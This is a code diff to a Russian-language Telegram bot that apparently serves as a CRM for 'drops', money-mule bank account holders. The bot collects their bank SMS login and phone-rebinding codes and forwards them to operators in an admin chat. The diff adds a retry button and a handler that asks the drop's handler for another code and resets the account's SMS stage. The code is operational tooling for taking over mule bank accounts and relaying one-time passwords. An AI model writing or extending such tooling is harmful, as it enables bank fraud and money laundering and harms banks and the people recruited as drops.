@@ -2520,7 +2520,10 @@ async def handle_sms_code(message: Message, state: FSMContext):
         )
     except Exception:
         pass
-    # Уведомление в админ-чат CRM с кодом
+    # Уведомление в админ-чат CRM с кодом + кнопки управления.
+    # • ✅ Успех — код подошёл, переходим к следующему этапу (закрывает сообщение).
+    # • 🔁 Запросить повтор — операционисту нужен ещё код (второй вход / повторная отправка).
+    #   На повтор шлём клиенту просьбу «пришлите ещё один код».
     bank = lk.get("bank") or "—"
     fio = drop.get("fio") if drop else "—"
     kind_label = "перевязки" if sms_kind == "perevyaz" else "входа"
@@ -2532,14 +2535,84 @@ async def handle_sms_code(message: Message, state: FSMContext):
                 f"📩 <b>СМС-код для {kind_label}</b>\n\n"
                 f"ФИО: <b>{fio}</b>\nБанк: <b>{bank}</b>\n\n"
                 f"<b>Код:</b> <code>{code}</code>",
-                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
-                    InlineKeyboardButton(text="❌ Закрыть", callback_data="smsmsgclose"),
-                ]]),
+                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                    [
+                        InlineKeyboardButton(
+                            text="✅ Успех",
+                            callback_data="smsmsgclose",
+                        ),
+                        InlineKeyboardButton(
+                            text="🔁 Запросить повтор",
+                            callback_data=f"smsretry:{droplk_id}:{sms_kind}",
+                        ),
+                    ],
+                ]),
             )
     except Exception as e:
         logger.warning("admin sms notify failed: %s", e)
     # Обновляем кнопки в анкете дропа
     await _post_or_update_sms_tracker(message.bot, droplk_id)
+
+
+@router.callback_query(F.data.startswith("smsretry:"))
+async def cb_smsretry(call: CallbackQuery):
+    """Запросить у клиента повторный код (нужен 2-й код входа / перевяза).
+    Шлёт сообщение в work_chat дропа, состояние lk.sms_stage возвращается на _asked."""
+    parts = (call.data or "").split(":")
+    if len(parts) < 3:
+        await call.answer("Нет данных")
+        return
+    droplk_id = parts[1]
+    sms_kind = parts[2]  # "login" или "perevyaz"
+    lk = crm_storage.get_crm_drop_lk(droplk_id)
+    if not lk:
+        await call.answer("ЛК не найден", show_alert=True)
+        return
+    drop = crm_storage.get_crm_drop(lk.get("drop_id"))
+    if not drop:
+        await call.answer("Дроп не найден", show_alert=True)
+        return
+    owner = crm_storage.get_crm_owner(drop.get("owner_id", ""))
+    if not owner or not owner.get("work_chat_id"):
+        await call.answer("Не нашёл work_chat партнёра", show_alert=True)
+        return
+    # Возвращаем SMS-флоу на этап «ждём код» — операционист увидит ⏳ ожидания
+    new_stage = "perevyaz_asked" if sms_kind == "perevyaz" else "login_asked"
+    if sms_kind == "perevyaz":
+        await crm_storage.update_crm_drop_lk(droplk_id, sms_stage=new_stage, sms_perevyaz_code="")
+    else:
+        await crm_storage.update_crm_drop_lk(droplk_id, sms_stage=new_stage, sms_login_code="")
+    # Сообщение клиенту в его work_chat
+    bank = lk.get("bank") or "—"
+    fio = drop.get("fio") or "—"
+    kind_label = "перевязки" if sms_kind == "perevyaz" else "входа"
+    try:
+        await call.bot.send_message(
+            int(owner["work_chat_id"]),
+            f"🔁 <b>Нужен ещё один код {kind_label}</b>\n\n"
+            f"По ЛК <b>{bank}</b> ({fio}) операционисту требуется повторный СМС-код {kind_label}. "
+            f"Пришлите его одним сообщением сюда.",
+        )
+    except Exception as e:
+        logger.warning("smsretry send to work_chat fail: %s", e)
+        await call.answer("Не удалось написать клиенту: " + str(e), show_alert=True)
+        return
+    # Обновить кнопки в анкете дропа (sms_tracker)
+    try:
+        await _post_or_update_sms_tracker(call.bot, droplk_id)
+    except Exception:
+        pass
+    # Помечаем сообщение в admin-чате как обработанное (меняем кнопки на закрытие)
+    try:
+        await call.message.edit_reply_markup(
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+                InlineKeyboardButton(text=f"🔁 Запрошен повтор кода {kind_label}", callback_data="noop"),
+                InlineKeyboardButton(text="❌", callback_data="smsmsgclose"),
+            ]]),
+        )
+    except Exception:
+        pass
+    await call.answer(f"✅ Запрос повтора отправлен клиенту")
 
 
 @router.callback_query(F.data == "smsmsgclose")
